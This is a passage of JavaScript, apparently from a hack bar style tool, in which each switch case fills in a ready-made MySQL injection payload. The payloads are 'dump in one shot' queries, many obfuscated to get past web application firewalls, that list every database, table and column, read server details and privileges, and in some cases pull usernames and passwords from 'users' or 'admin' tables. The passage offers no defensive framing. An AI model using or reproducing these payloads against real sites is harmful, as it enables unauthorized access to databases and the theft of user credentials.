						txt = "(select+concat(0x3c666f6e7420666163653d43616d627269612073697a653d323e72306f74404833583439203a3a20,version(),0x3c666f6e7420636f6c6f723d7265643e3c62723e,0x446174616261736573203a7e205b,(Select+count(Schema_name)from(information_Schema.schemata)),0x5d3c62723e5461626c6573203a7e205b,(Select+count(table_name)from(information_schema.tables)),0x5d3c62723e436f6c756d6e73203a7e205b,(Select+count(column_name)from(information_Schema.columns)),0x5d3c62723e,@)from(select(@:=0x00),(@db:=0),(@db_nr:=0),(@tbl:=0),(@tbl_nr:=0),(@col_nr:=0),(select(@)from(information_Schema.columns)where(@)in(@:=concat(@,if((@db!=table_schema),concat((@tbl_nr:=0x00),0x3c666f6e7420636f6c6f723d7265643e,LPAD(@db_nr:=@db_nr%2b1,2,0x20),0x2e20,@db:=table_schema,0x2020202020203c666f6e7420636f6c6f723d707572706c653e207b205461626c6573203a7e205b,(Select+count(table_name)from(information_schema.tables)where(table_schema=@db)),0x5d7d203c2f666f6e743e3c2f666f6e743e),0x00),if((@tbl!=table_name),concat((@col_nr:=0x00),0x3c646976207374796c653d70616464696e672d6c6566743a343070783b3e3c666f6e7420636f6c6f723d626c75653e202020,LPAD(@tbl_nr:=@tbl_nr%2b1,3,0x0b), 0x2e20,@tbl:=table_name,0x20202020203c666f6e7420636f6c6f723d707572706c653e2020207b2020436f6c756d6e73203a7e20205b,(Select+count(column_name)from(information_Schema.columns)where(table_name=@tbl)),0x5d202f203c666f6e7420636f6c6f723d626c61636b3e205265636f726473203a7e205b,(Select+ifnull(table_rows,0x30)+from+information_schema.tables+where+table_name=@tbl),0x5d207d3c2f666f6e743e3c2f666f6e743e3c2f666f6e743e3c2f6469763e),0x00),concat(0x3c646976207374796c653d70616464696e672d6c6566743a383070783b3e3c666f6e7420636f6c6f723d677265656e3e,LPAD(@col_nr:=@col_nr%2b1,3,0x0b),0x2e20,column_name,0x3c2f666f6e743e3c2f6469763e)))))x)";
					break;
			case 'Using Replace':
						txt = "replace(replace(replace(0x232425,0x23,@:=replace(replace(replace(replace(0x243c62723e253c62723e3c666f6e7420636f6c6f723d7265643e263c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d707572706c653e273c2f666f6e743e3c666f6e7420636f6c6f723d7265643e,0x24,0x3c62723e3c62723e3c666f6e7420636f6c6f723d626c61636b3e72306f744048335834393c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e),0x25,version()),0x26,database()),0x27,user())),0x24,(select+count(*)+from+%0Ainformation_schema.columns+where+table_schema=database()+and@:=replace(replace(0x003c62723e2a,0x00,@),0x2a,table_name))),0x25,@)";
					break;
			case 'MakMan WAF':
					var dbName = prompt("Database Name","database()");
                    var dbNameFinal = "0x";
                    if(dbName == "database()"){dbNameFinal="database()";}
                    else{
                        // Convert DB name to hexa
                        for (var i = 0; i < dbName.length; i++){
                          dbNameFinal += dbName.charCodeAt(i).toString(16);
                        }
                    }
					txt = "(select(@x)from(select(@x:=0x00),(@nr:=0),(@tbl:=0x0),(select(0)from(information_schema.tables)where(table_schema=" + dbNameFinal + ")and(0x00)in(@x:=concat_ws(0x20,@x,lpad(@nr:=@nr%2b1,3,0x0b),0x2e20,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d677265656e3e203a3a3a3a3c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e20207b2020436f6c756d6e73203a3a205b3c666f6e7420636f6c6f723d7265643e,(select+count(*)+from+information_schema.columns+where+table_name=@tbl),0x3c2f666f6e743e5d20207d3c2f666f6e743e,0x3c62723e))))x)";
					break;
			case 'Ajkaro':  txt = "(select(@x)from(select(@x:=0x00),(@running_number:=0),(@tbl:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=Concat(@x,0x3c62723e,if((@tbl!=table_name),Concat(0x3c2f6469763e,LPAD(@running_number:=@running_number%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c62723e,(@z:=0x00),0x3c646976207374796c653d226d617267696e2d6c6566743a333070783b223e), 0x00),lpad(@z:=@z%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d626c75653e,column_name,0x3c2f666f6e743e))))x)";
					break;
			case 'Zen WAF':
						txt = "(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)";
					break;
			case 'Zen_1':
					txt = "/*!50000make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)*/";
					break;		
			case 'WAF':
						txt = "(/*!50000select*/+concat+(@:=0,(/*!50000select*/+count(*) from+/*!50000information_schema.tables*/+WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND@:=concat+(@,0x3c62723e,/*!50000table_name*/)),@))";
					break;
			case 'Rummy':
						txt = "(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(0x00)in(@x:=concat(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x)";
					break;
		   case 'Shariq':
						txt = "(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)";
					break;
			case 'H3LL4R_H5H':
						txt = "concat%280x3c2f686561643e3c626f6479206267636f6c6f72203d20626c61636b3e3c62723e3c68313e7e3a20496e6a65637465642042792048656c6c657220485348203a7e3c2f68313e3c62723e3c666f6e742073697a653d3620636f6c6f723d677265656e3e4461746162617365203a20,database%28%29,0x3c2f666f6e743e3c62723e3c666f6e7420636f6c6f72203d2079656c6c6f772073697a653d363e2055534552203a20,user(),0x3c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d7265642073697a653d373e20486176652053796d6c696e6b203f203a20,@@HAVE_SYMLINK,0x203c2f666f6e743e3c62723e3c666f6e742073697a65203d203520636f6c6f72203d2079656c6c6f773e20486f73746e616d65203a20,@@HOSTNAME,0x3c6469763e3c666f6e7420636f6c6f723d207265643e3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3c2f6469763e3c2f666f6e743e3c2f666f6e743e3c68333e3c666f6e7420636f6c6f72203d726564203e44617461626173657320616e6420436f6c756d6e7320496e666f20203a203c62723e3c2f666f6e743e3c666f6e7420636f6c6f723d677265656e3e,%28SELECT%28@y%29FROM%28SELECT%28@y:=0x00%29,%28@NR:=0%29,%28SELECT%280%29FROM%28INFORMATION_SCHEMA.SCHEMATA%29WHERE%28SCHEMA_NAME!=0x696e666f726d6174696f6e5f736368656d612e736368656d617461%29AND%280x00%29IN%28@y:=CONCAT%28@y,LPAD%28@NR:=@NR%2b1,2,0x30%29,0x3a20,schema_name,0x3c62723e%29%29%29%29y%29,0x3c62723e3c666f6e7420636f6c6f723d626c75652073697a653d353e2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d7e7e7e7e7e7e7e2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d3c2f666f6e743e3c62723e,%28select%28@x%29from%28select%28@x:=0x00%29,%28@nr:=0%29,(@tbl:=0x0%29,%28select%280%29from%28information_schema.tables%29where%28table_schema=database%28%29%29and%280x00%29in%28@x:=concat_ws%280x20,@x,lpad%28@nr:=@nr%2b1,3,0x0b%29,0x2e203c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e3c666f6e7420636f6c6f723d677265656e3e203a3a3a3a3c2f666f6e743e3c666f6e7420636f6c6f723d79656c6c6f773e20207b2020436f6c756d6e73203a3a205b3c666f6e7420636f6c6f723d7265643e,%28select+count%28*%29+from+information_schema.columns+where+table_name=@tbl%29,0x3c2f666f6e743e5d20207d3c2f666f6e743e3c62723e%29%29%29%29x%29,0x3c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d626c75652073697a653d352e333e3d3d3d3d3d7e7e7e7e7e4853487e7e7e7e7e3d3d3d3d3d4853483d3d3d3d3d7e7e7e7e7e4853483d3d3d3d3d7e7e7e7e7e4853487e7e7e7e7e3d3d3d3d3d4853483d3d3d3d3d7e7e7e7e7e4853483c2f666f6e743e3c62723e3c62723e3c666f6e7420636f6c6f723d79656c6c6f772073697a653d343e4578747261637465642044617461203a203c2f666f6e743e3c62723e3c68313e7e3a2048454c4c45522028204853482029205741532048455245203a7e3c2f68313e203c62723e3c64697620616c69676e3d226c656674223e,%28select+concat%280x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e546f74616c20436f6c756d6e20436f756e7420416c6c20446174616261736573203a7e2048454c4c455227532044494f53207e5b,%28Select+count%28column_name%29from%28information_Schema.columns%29%29,0x5d3c62723e3c62723e2f7e,@%29from%28select%28@:=0x00%29,%28@db:=0%29,%28@db_nr:=0%29,%28@tbl:=0%29,%28@tbl_nr:=0%29,%28@col_nr:=0%29,%28select%28@%29from%28information_Schema.columns%29where%28@%29in%28@:=concat%28@,if%28%28@db!=table_schema%29,concat%28%28@tbl_nr:=0x00%29,0x3c666f6e7420636f6c6f723d7265643e,LPAD%28@db_nr:=@db_nr%2b1,2,0x20%29,0x2e20,@db:=table_schema,0x203c666f6e7420636f6c6f723d707572706c653e207e3a205461626c657320436f756e7420546f74616c203a7e202848454c4c455227732044494f5329205b,%28Select+count%28table_name%29from%28information_schema.tables%29where%28table_schema=@db%29%29,0x5d2f7e3c2f666f6e743e3c2f666f6e743e%29,0x00%29,if%28%28@tbl!=table_name%29,concat%28%28@col_nr:=0x00%29,0x3c646976207374796c653d70616464696e672d6c6566743a343070783b3e3c666f6e7420636f6c6f723d626c75653e202020,LPAD%28@tbl_nr:=@tbl_nr%2b1,3,0x0b%29,0x202e20,@tbl:=table_name,0x20202020203c666f6e7420636f6c6f723d707572706c653e2020207b2020436f6c756d6e73203a202848656c6c657227732044696f7329207e20205b,%28Select+count%28column_name%29from%28information_Schema.columns%29where%28table_name=@tbl%29%29,0x5d202f203c666f6e7420636f6c6f723d79656c6c6f773e205265636f726473203a2048454c4c455227732044494f537e205b,%28Select+ifnull%28table_rows,0x30%29+from+information_schema.tables+where+table_name=@tbl%29,0x5d207d3c2f666f6e743e3c2f666f6e743e3c2f666f6e743e3c2f6469763e%29,0x00%29,concat%280x3c646976207374796c653d70616464696e672d6c6566743a383070783b3e3c666f6e7420636f6c6f723d677265656e3e,LPAD%28@col_nr:=@col_nr%2b1,3,0x0b%29,0x2e20,column_name,0x3c2f666f6e743e3c2f6469763e%29%29%29%29%29x%29,0x3c2f6469763e%29";
					break;
			case 'Harsha Haxor':
						txt = "concat(0x3c68323e3c63656e7465723e3c666f6e742073697a653d223235222f3e203c666f6e7420636f6c6f723d2279656c6c6f77223e496e6a656374657220414c49454e205348414e553c2f666f6e743e3c2f63656e7465723e3c2f68323e20,0x3c62723e,@@datadir,0x3C62723E3C666F6E7420636F6C6F723D626C75653E7C557365727C207E3E203C2F666F6E743E,0x3c617564696f206175746f706c61793e3c736f75726365207372633d22687474703a2f2f6c712e646a2d70756e6a61622e696e666f2f736f6e67732f34382f32363238342f536f756c6a617325323053746f727925323028526161674a6174742e636f6d292e6d7033223e3c2f617564696f3e,user(),0x3C62723E3C666F6E7420636F6C6F723D677265656E3E7C56657273696F6E7C207E3E203C2F666F6E743E,version(),0x3C62723E3C666F6E7420636F6C6F723D707572706C653E7C44427C207E3E3E203C2F666F6E743E,database(),0x3C62723E3C666F6E7420636F6C6F723D233842303030303E7C506F72747C207E3E3E203C2F666F6E743E,@@port,0x3C62723E3C666F6E7420636F6C6F723D233737383839393E7C546D704469727C207E3E3E203C2F666F6E743E,@@tmpdir,0x3C62723E3C666F6E7420636F6C6F723D234443313433433E7C43757272656E745F557365727C207E3E3E203C2F666F6E743E,current_user(),0x3C62723E3C666F6E7420636F6C6F723D234646443730303E7C53797374656D5F557365727C207E3E3E203C2F666F6E743E,system_user(),0x3C62723E3C666F6E7420636F6C6F723D233546394541443E7C53657373696F6E5F557365727C207E3E3E203C2F666F6E743E,session_user(),0x3C62723E3C666F6E7420636F6C6F723D6C696D653E7C536368656D617C207E3E3E203C2F666F6E743E,schema(),0x3c62723e,0x3c666f6e7420636f6c6f723d626c75653e,0x7c486f7374204e616d657c207e203e3e,@@HOSTNAME,0x3c62723e,0x3c666f6e7420636f6c6f723d7265643e,0x7c53796d6c696e6b7c207e203e3e,@@HAVE_SYMLINK,0x3c62723e,0x3c666f6e7420636f6c6f723d2077686974653e,0x3c666f6e742073697a653d333e,0x7c426974732044657461696c737c207e203e3e,@@VERSION_COMPILE_MACHINE,0x3c62723e%20,0x3c666f6e7420666163653d636f75726965723e,0x7c46696c652053797374656d7c207e203e3e,@@CHARACTER_SET_FILESYSTEM,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)%20)";
					break;	
			case 'DHANI WAF':
						txt = "/*!00000concat*/(0x3c666f6e7420666163653d224963656c616e6422207374796c653d22636f6c6f723a7265643b746578742d736861646f773a307078203170782035707820233030303b666f6e742d73697a653a33307078223e496e6a6563746564206279204468346e692056757070616c61203c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d70696e6b2073697a653d353e44622056657273696f6e203a20,version(),0x3c62723e44622055736572203a20,user(),0x3c62723e3c62723e3c2f666f6e743e3c7461626c6520626f726465723d2231223e3c74686561643e3c74723e3c74683e44617461626173653c2f74683e3c74683e5461626c653c2f74683e3c74683e436f6c756d6e3c2f74683e3c2f74686561643e3c2f74723e3c74626f64793e,(select%20(@x)%20/*!00000from*/%20(select%20(@x:=0x00),(select%20(0)%20/*!00000from*/%20(information_schema/**/.columns)%20where%20(table_schema!=0x696e666f726d6174696f6e5f736368656d61)%20and%20(0x00)%20in%20(@x:=/*!00000concat*/(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x))";
					break;	
            case 'Dhani':
						txt = "concat(0x3c666f6e7420666163653d224963656c616e6422207374796c653d22636f6c6f723a7265643b746578742d736861646f773a307078203170782035707820233030303b666f6e742d73697a653a33307078223e496e6a6563746564206279204468346e692056757070346c613a3a4772656574277320546f20416c6c204861636b6572277320203c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d626c75652073697a653d353e44622056657273696f6e203a,version(),0x3c62723e44622055736572203a20,user(),0x3c62723e506f7274203a,@@PORT,0x3c62723e436865636b2069662053796d6c696e6b206973204f4e203a,@@HAVE_SYMLINK,0x3c62723e536572766572204f73204465746563746564203a,@@VERSION_COMPILE_OS,0x3c62723e436865636b207768696368204f70657261746f72732063616e20626520757365204572726f723a,@@FT_BOOLEAN_SYNTAX,0x3c62723e3c62723e3c2f666f6e743e3c7461626c6520626f726465723d2231223e3c74686561643e3c74723e3c74683e44617461626173653c2f74683e3c74683e5461626c653c2f74683e3c74683e436f6c756d6e3c2f74683e3c2f74686561643e3c2f74723e3c74626f64793e,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20(information_schema/**/.columns)%20where%20(table_schema!=0x696e666f726d6174696f6e5f736368656d61)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x))";
					break;	
			case 'Rahul R@Z':
						txt = "unhex(hex(/*!50000concat*/(0x3c62723e3c666f6e7420636f6c6f723d22726564222073697a653d2237223e7e7e416c69656e205368616e757e7e3c2f666f6e743e3c62723e56657273696f6e7e,/*!50000version*/(),0x7e20,@@version_comment,0x3c62723e557365727e,/*!50000user*/(),0x3c62723e5072696d6172792044617461626173657e,/*!database*/(),0x3c62723e3c666f6e7420636f6c6f723d22677265656e223e4e6f204f66204461746162617365737e,(/*!50000select*/ count(/*!50000schema_name*/) from /*!50000information_schema*/.SCHEMATA),0x3c62723e4e6f204f66205461626c65737e,(/*!50000select*/ count(*) from /*!50000information_schema*/.tables where table_schema=/*!database*/()),(/*!50000select*/(@x)from(/*!50000select*/(@x:=0x00),(@xz:=0),(@xx:=0x00),(/*!50000select*/(0)from(/*!50000information_schema*/.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(0x00)in(@x:=/*!50000concat*/(@x,0x3c62723e,if((@xx!=table_name),/*!50000concat*/(0x3c2f6469763e,LPAD(@xz:=@xz%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d7265643e,0x7c7c,/*!50000table_schema*/,0x7c7c3c2f666f6e743e3c666f6e7420636f6c6f723d2279656c6c6f77223e,@xx:=/*!50000table_name*/,0x3c2f666f6e743e,0x3c62723e,(@z:=0x00),0x3c646976207374796c653d226d617267696e2d6c6566743a333070783b223e), 0x00),lpad(@z:=@z%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d626c75653e,/*!50000column_name*/,0x3c2f666f6e743e))))x))))";
					break;	
			case 'Lokomedia':
						txt = "'+div+false+/*!00000UNION*/+/*!00000SELECT*/+/*!00000CONCAT*/(0x3c2f7469746c653e,(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(0)/*!FROM*/(users)WHERE(@x:=/*!00000CONCAT*/(@x,0x3c62723e,username,0x207c20,password))))x))--+";
					break;	
			case 'Sec7or Team':
						txt = "make_set(6,@:=0x0a,(select(1)from(information_schema./**/columns)where@:=make_set(511,@,0x3c6c693e,0x5b20,table_schema,0x205d2d2d3e20,table_name,0x3a3a,column_name)),@)";
					break;

					case 'Mr.Silent coder':
					txt = "concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c696d67207372633d2268747470733a2f2f312e62702e626c6f6773706f742e636f6d2f2d456262354b36356f4a49552f56336171695854394671492f41414141414141414353452f76475977714c6c504f73733251574c376e335874794a5376515a2d367a41672d77434c63422f73313630302f486f77253242746f253242496e637265617365253242496e7465726e657425324242726f77736572732532425370656564253242696e25324255726475253242616e6425324248696e6469253242566964656f2532425475746f7269616c2e504e47223e3c666f6e7420636f6c6f723d7265642073697a653d353e3c623e4d722e73696c656e7420636f646572203c666f6e7420636f6c6f723d626c61636b2073697a653d343e2866336d6178293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c6669656c647365743e3c7374726f6e673e3c62723e3c63656e7465723e3c623e3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e20203c666f6e7420636f6c6f723d626c61636b3e,version(),0x7e20,@@version_comment,0x3c2f666f6e743e,0x3c62723e5072696d617279204461746162617365203c666f6e7420636f6c6f723d626c61636b3e20203a3a,@d:=database() ,0x3c2f666f6e743e ,0x3c62723e44617461626173652055736572203c666f6e7420636f6c6f723d626c61636b3e203a3a,user(),0x3c2f666f6e743e,0x3c2f623e3c62723e,(SELECT+GROUP_CONCAT(0x50726976696c656765732020203c666f6e7420636f6c6f723d626c61636b3e203a3a,GRANTEE,0x3a3a,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES),0x3c2f63656e7465723e3c2f7374726f6e673e3c2f6669656c647365743e,(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c6669656c647365743e3c6c6567656e643e,0x3c623e3c666f6e7420636f6c6f723d626c61636b3e,'Table Name',0x3c2f6c6567656e643e3c2f666f6e743e3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name, 0x3c623e3c666f6e7420636f6c6f723d677265656e3e3a3a20446174616261736520203c666f6e7420636f6c6f723d626c61636b3e5b,database(),0x5d3c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e3c2f623e3c2f6669656c647365743e))))x)))))*/";
					break;
			
			case 'R3yz3':
						txt = "(select(@x)from(select(@x:=0x00),(select(0)/*!From*/(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat (@x,0x3c62723e,table_name,0x203a3a20,column_name))))x)";
					break;		
			



            case 'Profexer':
						txt = "(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)";
					break;
					
			
			case 'DIOS 403 - T&C':
						txt = "and mod(29.9) and  @a:=((SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM({f/*!50000informatioN_Schema*/.columns})WHERE(@x)IN(@x:=CONCAT(0x20,@x,table_name,':::',column_name,0x3c62723))))x))union distinctrOw /*!50000sElect*/";
					break;		
			
            case 'DIOS 403 - U&P':
						txt = "and mod(29.9) and  @a:=((SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM(admin)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,':::',password,0x3c62723))))x))union distinctrOw /*!50000sElect*/";
					break;
            case 'SK1':
						txt = "concat/***/(0x223e3c2f7461626c653e3c2f6469763e3c2f613e3c666f6e7420636f6c6f723d677265656e3e3c62723e3c62723e3c62723e,0x3c666f6e7420666163653d63616d62726961207374796c653d726567756c61722073697a653d3320636f6c6f723d7265643e7e7e7e7e7e3a3a3a3a3a496e6a656374656420627920416c69656e205368616e753a3a3a3a3a7e7e7e7e7e3c62723e3c666f6e7420636f6c6f723d626c75653e2056657273696f6e203a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e,version(),0x3c62723e3c666f6e7420636f6c6f723d626c75653e204461746162617365203a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e,database(),0x3c62723e3c666f6e7420636f6c6f723d626c75653e2055736572203a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e,user(),0x3c62723e3c666f6e7420636f6c6f723d7265643e205461626c657320203c2f666f6e743e203a3a3a3a3a3a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e436f6c756d6e733c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e,@:=0,%28Select+count(*)from%28information_Schema.columns)where(table_schema=database())and@:=concat/**/(@,0x3c6c693e,0x3c666f6e7420636f6c6f723d7265643e,table_name,0x3c2f666f6e743e203a3a3a3a3a3a3a3a3a3a3a2020203c666f6e7420636f6c6f723d677265656e3e,column_name,0x3c2f666f6e743e)),@,0x3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e)";
					break;
			case 'SK2':
						txt = "concat(0x3c666f6e7420666163653d224963656c616e6422207374796c653d22636f6c6f723a626c75653b746578742d736861646f773a307078203170782035707820233030303b666f6e742d73697a653a33307078223e28496e6a656374656420627920416c69656e205368616e75293c2f666f6e743e,0x3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d353e44622056657273696f6e203a20,version(),0x3c62723e44622055736572203a20,user(),0x3c62723e3c62723e3c2f666f6e743e3c7461626c6520626f726465723d2231223e3c74686561643e3c74723e3c74683e44617461626173653c2f74683e3c74683e5461626c653c2f74683e3c74683e436f6c756d6e3c2f74683e3c2f74686561643e3c2f74723e3c74626f64793e,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20(information_schema/**/.columns)%20where%20(table_schema!=0x696e666f726d6174696f6e5f736368656d61)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x))";
					break;
			case 'SK3':
						txt = "concat(0x3c666f6e7420636f6c6f723d7265643e496e6a656374656420427920416c69656e205368616e75,0x3c62723e,0x56657273696f6e3a3a,version(),0x3c62723e,0x746f74616c206e756d626572206f66204461746162617365733a3a,(select count(*) from information_schema.schemata),0x3c2f666f6e743e,0x3c62723e,0x746f74616c206e756d626572206f66205461626c65733a3a,@running_number:=(Select count(*)from information_schema.tables where table_schema!=0x696e666f726d6174696f6e5f536368656d61),0x3c62723e,0x746f74616c206e756d626572206f6620636f6c756d6e733a3a,(select count(*) from information_schema.columns ),0x3c62723e,0x636f756c6d6e732066726f6d205072696d6172792044617461626173653a3a,(select count(*) from information_schema.columns where table_Schema!=0x696e666f726d6174696f6e5f736368656d61),0x3c62723e,0x746f74616c20636f6c756d6e732066726f6d20736368656d613a3a,(select count(*) from information_schema.columns where table_Schema=0x696e666f726d6174696f6e5f736368656d61),@c:=0x00,if((select count(*) from information_schema.tables where table_schema=database() and @c:=concat(@c,0x3c62723e,lpad( (@running_number:=@running_number-1),3,0x30 ),0x2e20, @tbl:=table_name,0x3c666f6e7420636f6c6f723d626c75653e,0x2d2d2d2d2d2d2d3e7461626c65207265636f7264733a3a,0x3c2f666f6e743e3c666f6e7420636f6c6f723d677265656e3e,(select table_rows from information_schema.tables where table_schema=Database() and table_name=@tbl),0x3c2f666f6e743e,0x2e)),0x00,0x00),@c)";
					break;
			case 'SK4':
						txt = "concat(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,concat(concat(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a20416c69656e205368616e753a3a203c2f666f6e743e3c2f63656e7465723e3c2f623e),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),concat(0x3c62723e3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c62723e546f74616c205461626c657320496e20416c6c20446174616261736573203a3a20,(select count(*) from information_Schema.tables),0x3c62723e5461626c657320436f756e7420496e205072696d617279204461746162617365203a3a20,(Select count(*) from information_Schema.tables where table_schema=database()),(select(@x)from(select(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(select(0) from(information_schema.columns)where(table_schema=database()) and(0x00)in(@x:=Concat(@x, 0x3c62723e, if( (@tbl!=table_name), Concat(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,LPAD(@r:=@r%2B1, 2, 0x30),0x2e,@tbl:=table_name,0x3c666f6e7420636f6c6f723d626c61636b3e203a3a20436f6c756d6e7320496e2054686973205461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@tbl),0x20284461746162617365203a3a20,database(),0x29,0x3c2f666f6e743e,0x3c62723e), 0x00),0x203a3a20,0x3c666f6e7420636f6c6f723d677265656e2073697a653d323e,0x7e20,column_name,0x3c2f666f6e743e ))))x))))";
					
			case 'SK5':
